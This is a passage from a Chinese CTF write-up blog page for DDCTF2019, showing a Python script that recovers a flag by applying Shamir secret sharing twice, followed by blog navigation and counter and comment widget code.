+<h2 id="联盟决策大会"><a href="#联盟决策大会" class="headerlink" title="联盟决策大会"></a>联盟决策大会</h2><p>Shamir 秘密分享方案, 密码学刚学, 在 <a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing" target="_blank" rel="noopener">wiki</a> 上有个挺好的脚本,<br>题目相当于用两次 Shamir, 这样就可以让两个组织都到才能解密, 把脚本照着这个思路稍微改一下就能拿到 flag,  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12th Mersenne Prime</span></span><br><span class="line"><span class="comment"># (for this application we want a known prime number as close as</span></span><br><span class="line"><span class="comment"># possible to our security level; e.g.  desired security level of 128</span></span><br><span class="line"><span class="comment"># bits -- too large and all the ciphertext is large; too small and</span></span><br><span class="line"><span class="comment"># security is compromised)</span></span><br><span class="line">_PRIME = <span class="number">0xC53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4E32D331535F08FC6338748C8447E72763A07F8AF7</span></span><br><span class="line"><span class="comment"># 13th Mersenne Prime is 2**521 - 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ... 省略</span></span><br><span class="line"></span><br><span class="line">t1 = (<span class="number">1</span>,<span class="number">0x30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A</span>)</span><br><span class="line">t2 = (<span class="number">2</span>,<span class="number">0x1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7</span>)</span><br><span class="line">t3 = (<span class="number">4</span>,<span class="number">0x1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC</span>)</span><br><span class="line">t4 = (<span class="number">3</span>,<span class="number">0x300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA</span>)</span><br><span class="line">t5 = (<span class="number">4</span>,<span class="number">0x1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022957B0C0584199F02790AAC61D7132F7DB6A8F77B9</span>)</span><br><span class="line">t6 = (<span class="number">5</span>,<span class="number">0x9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67CA8F3CC3BC157E5853E29537E8B9A55C0CF927FE45</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''main function'''</span></span><br><span class="line">    shares = [t1,t2,t3]</span><br><span class="line">    shares2 = [t4,t5,t6]</span><br><span class="line">    a = recover_secret(shares)</span><br><span class="line">    b = recover_secret(shares2)</span><br><span class="line">    t7 = (<span class="number">1</span>, a)</span><br><span class="line">    t8 = (<span class="number">2</span>, b)</span><br><span class="line">    c = recover_secret([t7, t8])</span><br><span class="line">    c = hex(c)[<span class="number">2</span>:]</span><br><span class="line">    print(c)</span><br><span class="line">    print(bytes.fromhex(c))</span><br><span class="line">    <span class="comment">#shares = []</span></span><br><span class="line">    <span class="comment">#a = recover_secret(shares)</span></span><br><span class="line">    <span class="comment">#print(a)</span></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>rmb122
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://rmb122.com/2019/04/25/DDCTF2019-Writeup/" title="DDCTF2019 Writeup">https://rmb122.com/2019/04/25/DDCTF2019-Writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章仅仅记录学习过程, 并不保证文章完全正确, 如果你有任何疑问或者找出问题, 欢迎在评论区指正.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+              <a href="/tags/ddctf/" rel="tag"># ddctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/" rel="prev" title="干掉 PHP 不死马">
+      <i class="fa fa-chevron-left"></i> 干掉 PHP 不死马
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/04/25/Ciscn-2019-%E5%88%9D%E8%B5%9B-Writeup/" rel="next" title="Ciscn 2019 初赛 Writeup">
+      Ciscn 2019 初赛 Writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#滴"><span class="nav-number">1.1.</span> <span class="nav-text">滴~</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-签到题"><span class="nav-number">1.2.</span> <span class="nav-text">WEB 签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Upload-IMG"><span class="nav-number">1.3.</span> <span class="nav-text">Upload-IMG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#homebrew-event-loop"><span class="nav-number">1.4.</span> <span class="nav-text">homebrew event loop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#大吉大利-今晚吃鸡"><span class="nav-number">1.5.</span> <span class="nav-text">大吉大利,今晚吃鸡~</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql弱口令"><span class="nav-number">1.6.</span> <span class="nav-text">mysql弱口令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">2.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-Reverse1"><span class="nav-number">2.1.</span> <span class="nav-text">Windows Reverse1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-Reverse2"><span class="nav-number">2.2.</span> <span class="nav-text">Windows Reverse2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#真-签到题"><span class="nav-number">3.1.</span> <span class="nav-text">真-签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#北京地铁"><span class="nav-number">3.2.</span> <span class="nav-text">北京地铁</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MulTzor"><span class="nav-number">3.3.</span> <span class="nav-text">MulTzor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN-strike"><span class="nav-number">3.4.</span> <span class="nav-text">[PWN] strike</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Wireshark"><span class="nav-number">3.5.</span> <span class="nav-text">Wireshark</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#联盟决策大会"><span class="nav-number">3.6.</span> <span class="nav-text">联盟决策大会</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rmb122"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">rmb122</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/rmb122" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rmb122" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rmb122</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"oWisX9yfxPr6EEXVYiXpOA6q-gzGzoHsz","app_key":"uncoOWuY3UMhnT98zdzJeh5U","server_url":null,"security":true};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    new Valine(Object.assign({
+      el         : '#valine-comments',
+      path       : location.pathname,
+    }, {"enable":true,"appId":"oWisX9yfxPr6EEXVYiXpOA6q-gzGzoHsz","appKey":"uncoOWuY3UMhnT98zdzJeh5U","notify":false,"verify":true,"placeholder":"Write something here","avatar":"retro","meta":["nick","mail"],"pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null}
+    ));
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
